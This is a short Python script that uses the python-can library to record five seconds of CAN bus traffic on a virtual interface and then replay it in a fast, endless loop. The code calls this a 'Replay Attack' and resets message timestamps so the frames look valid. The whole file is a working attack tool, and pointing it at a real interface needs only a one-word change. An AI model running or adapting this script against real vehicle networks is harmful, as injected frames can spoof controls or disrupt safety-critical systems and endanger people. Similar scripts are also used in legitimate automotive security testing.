import can
import time
import sys

BUS_INTERFACE = 'vcan0'

def record(duration):
    print(f"🎙️  Recording {duration}s of traffic...")
    messages = []
    bus = can.ThreadSafeBus(channel=BUS_INTERFACE, interface='socketcan')
    
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            msg = bus.recv(timeout=0.1)
            if msg: messages.append(msg)
    except KeyboardInterrupt:
        pass
    finally:
        bus.shutdown()
    
    print(f"✅ Captured {len(messages)} frames.")
    return messages

def replay(messages):
    print(f"▶️  Replaying attack loop... (Press Ctrl+C to Stop)")
    bus = can.ThreadSafeBus(channel=BUS_INTERFACE, interface='socketcan')
    
    try:
        while True:
            for msg in messages:
                # Update timestamp to 'now' to look valid
                msg.timestamp = time.time()
                bus.send(msg)
                time.sleep(0.002) # Fast replay
            time.sleep(0.1) # Loop delay
    except KeyboardInterrupt:
        print("\n🛑 Replay Stopped.")
    finally:
        bus.shutdown()

def main():
    # 1. Record Phase
    captured = record(duration=5)
    if not captured: return

    # 2. Attack Phase
    # 2. Attack Phase
    print("⚠️  Launching Replay Attack...")
    replay(captured)

if __name__ == "__main__":
    main()
